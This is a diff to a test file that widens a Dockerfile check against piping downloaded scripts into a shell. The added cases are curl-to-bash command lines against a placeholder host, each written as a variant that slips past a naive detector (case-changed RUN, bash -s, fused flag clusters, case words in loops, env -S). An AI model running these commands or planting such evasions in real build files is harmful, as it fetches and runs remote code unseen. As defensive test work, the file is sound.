@@ -43,6 +43,10 @@ def test_nothing_pipes_a_downloaded_script_into_a_shell(path: Path):
     "snippet",
     [
         pytest.param("RUN curl -sSL https://x.example/i.sh | bash\n", id="one-line"),
+        # docker instruction names are case-insensitive. both spellings ran the payload in a real
+        # build: `run printf 'echo pwned\\n' | bash` printed `pwned`.
+        pytest.param("run curl -sSL https://x.example/i.sh | bash\n", id="lowercase-docker-run"),
+        pytest.param("Run curl -sSL https://x.example/i.sh | bash\n", id="mixed-case-docker-run"),
         pytest.param("RUN curl -fsSL https://x.example/i.sh \\\n    | bash\n", id="continuation"),
         # Docker strips comments BEFORE joining continuations, so this is still one RUN.
         pytest.param(
@@ -151,6 +155,16 @@ def test_nothing_pipes_a_downloaded_script_into_a_shell(path: Path):
         pytest.param("RUN curl -sSL https://x.example/i.sh | /bin/bash\n", id="absolute-path"),
         pytest.param("RUN curl -sSL https://x.example/i.sh | env bash\n", id="env-wrapper"),
         pytest.param("RUN curl -sSL https://x.example/i.sh | sudo -E bash\n", id="sudo-with-flag"),
+        # a bare shell, `-s`, and the special `-` operand all read commands from stdin. confirmed:
+        #   printf 'echo pwned\n' | bash       -> pwned
+        #   printf 'echo pwned\n' | bash -s    -> pwned
+        #   printf 'echo pwned\n' | bash -     -> pwned
+        pytest.param(
+            "RUN curl -fsSL https://x.example/i.sh | bash -s\n", id="bash-dash-s-reads-stdin"
+        ),
+        pytest.param(
+            "RUN curl -fsSL https://x.example/i.sh | bash -\n", id="bash-dash-reads-stdin"
+        ),
         pytest.param(
             "RUN curl -fsSL https://x.example/i.sh | bash -s -- --yes\n", id="bash-with-args"
         ),
@@ -238,6 +252,18 @@ def test_nothing_pipes_a_downloaded_script_into_a_shell(path: Path):
         pytest.param("RUN bash -lc 'curl -sSL https://x.example/i.sh | sh'\n", id="fused-flags-lc"),
         pytest.param(
             'RUN sh -euc "curl -sSL https://x.example/i.sh | bash"\n', id="fused-flags-euc"
+        ),
+        # `c` may precede more short options in the same cluster. the next argv word is still the
+        # program: `bash -cxe 'echo pwned'` printed the xtrace and then `pwned`.
+        pytest.param(
+            "RUN bash -cxe 'curl -sSL https://x.example/i.sh | bash'\n",
+            id="fused-flags-cxe",
+        ),
+        # an option in the same cluster may consume an argv word before the command string:
+        # `bash -eco pipefail 'echo pwned'` printed `pwned`.
+        pytest.param(
+            "RUN bash -eco pipefail 'curl -sSL https://x.example/i.sh | bash'\n",
+            id="fused-c-before-option-operand",
         ),
         # BusyBox's shell, and therefore `/bin/sh` on every Alpine image -- the base a vendor
         # install script is most likely to run under.
@@ -407,6 +433,18 @@ def test_nothing_pipes_a_downloaded_script_into_a_shell(path: Path):
             "RUN curl -sSL https://x.example/i.sh | for i in 1; do bash; done\n",
             id="for-clause-stage",
         ),
+        # `case` in a for word list is data, not a compound opener. re-arming case-pattern stripping
+        # there discarded the later group. confirmed with the fetch inside the line and outer stdin
+        # closed: `cat payload.sh | for i in case; do ( bash ); done` printed `pwned`.
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | for i in case; do ( bash ); done\n",
+            id="case-word-in-for-list",
+        ),
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh"
+            " | if true; then for i in case; do ( bash ); done; fi\n",
+            id="case-word-in-nested-for-list",
+        ),
         # `case` needs one thing more than the other compounds. Its branch labels end in `)` with
         # no opening `(`, so counting that as a group closer unbalanced the depth and the `;;`
         # split the pipeline anyway; and once the depth was fixed, the branch PATTERN was still
@@ -485,6 +523,15 @@ def test_nothing_pipes_a_downloaded_script_into_a_shell(path: Path):
             "RUN curl -sSL https://x.example/i.sh"
             " | if true; then case x in x) echo a;; esac; ( bash ); fi\n",
             id="group-after-a-closed-case",
+        ),
+        # a later `echo case` is an argument, not a new compound opener. treating every bare `case`
+        # as syntax re-armed label stripping and swallowed the group after it. confirmed:
+        #   cat payload.sh | if true; then case x in x) echo a;; esac;
+        #     echo case; ( bash ); fi   -> a, case, pwned
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh"
+            " | if true; then case x in x) echo a;; esac; echo case; ( bash ); fi\n",
+            id="case-argument-after-a-closed-case",
         ),
         # The WHOLE pipeline may sit inside the group or clause, rather than being piped into it.
         # Then the fetch never appears at the top level at all -- the enclosing construct is one
@@ -645,6 +692,17 @@ def test_nothing_pipes_a_downloaded_script_into_a_shell(path: Path):
         pytest.param(
             'RUN bash -c "curl -sSL \\"https://x.example/i.sh\\" | bash"\n',
             id="escaped-quotes-inside-a-command-string",
+        ),
+        # split-string can introduce the upstream fetch as well as the downstream shell. confirmed:
+        #   env -S 'cat payload.sh' | bash                    -> pwned
+        #   env --split-string='cat payload.sh' | bash        -> pwned
+        pytest.param(
+            "RUN env -S 'curl -sSL https://x.example/i.sh' | bash\n",
+            id="env-split-string-upstream-fetch",
+        ),
+        pytest.param(
+            "RUN env --split-string='curl -sSL https://x.example/i.sh' | bash\n",
+            id="env-split-string-upstream-fetch-long",
         ),
         # `env -S` SPLITS its operand into words and runs them, the opposite of the flags above:
         # the operand is not a value to step over, it is the command.
